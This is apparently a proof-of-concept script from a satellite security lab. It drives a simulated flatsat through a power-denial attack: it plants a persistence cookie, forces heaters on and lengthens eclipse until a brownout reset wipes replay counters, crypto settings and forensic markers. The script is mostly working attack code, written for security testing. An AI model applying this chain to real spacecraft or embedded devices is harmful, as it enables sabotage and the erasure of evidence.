#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-34  Power model: heaters + eclipse drain the 40 Wh battery until the
# rail collapses (< 21 V with empty battery) -> brownout RESET: volatile
# state (SDLS ARC, GPS overrides, crypto settings, persistence cookie)
# is lost while the attacker keeps firing TCs.
# SPARTA: IM-0003 (power denial) / state-loss chain into V-07/V-21
def main(dev, ev):
    # plant the V-21 cookie first, to prove the brownout wipes it
    dev.tc(0x1A, b"PERS" + bytes(28), via="radio")
    dev.tc(0x18, struct.pack("<IIH", fs.SYM_LOG_NAME,
                             fs.ADDR_WDT_SCRATCH + 28, 4), via="radio")
    dev.tc(0x02, b"", via="usb")                     # soft reboot: cookie lives
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    check(st.payload[-1] & 0x20, "cookie planted (PERSIST set)")
    check(not dev.sim.secure, "crypto was OFF under the cookie")
    # accelerate the orbit into permanent stress + 4 heaters
    dev.tc(0x1D, bytes([10]) + struct.pack(">H", 6553), via="usb")
    for i in range(4):
        dev.tc(0x24, bytes([i, 1]), via="radio")     # 4 x 2.4 W heaters
    f = dev.find(dev.tc(0x1D, b"\x00", via="usb"), 0x1D)[0]
    ev.log(f"load now {f.le16(12)/100:.1f} W (panels 3 W peak, eclipse 0 W)")
    brownout = None
    for i in range(40):
        for h in range(4):                        # safe-mode clears loads:
            dev.tc(0x24, bytes([h, 1]), via="radio")   # keep draining
        frames = dev.advance(2000)
        for t in dev.find(frames, 0x02):
            if t.payload[3] == 0x42:
                brownout = (i, t)
                break
        if brownout:
            break
        f = dev.find(dev.tc(0x1D, b"\x00", via="usb"), 0x1D)[0]
        if i % 8 == 0:
            ev.log(f"t+{2*(i+1)} s: bus={f.le16(10)/100:.2f} V "
                   f"power={f.le16(12)/100:.1f} W safe={f.u8(2)}")
    check(brownout, "brownout reset never fired")
    ev.log(f"BROWNOUT RESET ('B' boot-reason ack) at +{2*(brownout[0]+1)} s")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    f2 = st.payload[-1]
    ev.log(f"post-reset: secure={dev.sim.secure} flags2=0x{f2:02X} "
           f"PERSIST={bool(f2 & 0x20)} boot_count={dev.sim.boot_count}")
    check(dev.sim.secure, "crypto back to boot default ON (state lost)")
    check(not (f2 & 0x20), "watchdog scratch wiped -> V-21 cookie GONE")
    ev.log("=> power drain is also a STATE-RESET weapon: it rewinds ARC "
           "replay counters and erases forensic boot markers")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-34 heater/eclipse brownout reset", main))
